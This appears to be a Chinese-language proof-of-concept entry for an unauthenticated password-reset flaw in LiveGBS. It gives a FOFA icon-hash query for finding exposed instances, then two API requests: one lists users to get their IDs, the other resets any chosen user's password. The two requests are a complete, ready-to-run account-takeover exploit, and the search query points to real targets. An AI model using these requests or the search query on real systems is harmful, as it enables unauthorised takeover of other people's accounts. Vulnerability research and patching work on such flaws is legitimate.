# LiveGBS任意用户密码重置漏洞

LiveGBS部分接口存在未授权访问导致，可以通过组合漏洞修改任意用户密码

## fofa

```yaml
icon_hash="-206100324"
```

## poc

### 获取用户id

```
/api/v1/user/list?q=&start=&limit=10&enable=&sort=CreatedAt&order=desc
```

![image-20240820155005009](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408201550568.png)

### 通过id更改用户密码

```
/api/v1/user/resetpassword?id=22&password=123456
```

![image-20240820155041297](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408201550695.png)



## 漏洞来源

- https://mp.weixin.qq.com/s/6To5_MA83i7rEfrxlqNpAQ